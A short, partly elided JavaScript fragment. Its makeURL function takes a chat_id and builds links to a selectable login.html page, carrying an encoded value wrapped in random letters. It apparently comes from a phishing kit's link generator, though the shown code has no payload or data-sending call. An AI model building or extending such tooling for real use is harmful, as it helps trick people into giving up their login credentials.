...
const makeURL=(chat_id)=>{
    ...
    const selectedPage = document.querySelector('input[name="page"]:checked');
    
    if(urlInput.value!=""){url_result.value= `${urlInput.value}/${selectedPage.value}/login.html?val=${randomLetter}${encoded}${randomLetter}`;}
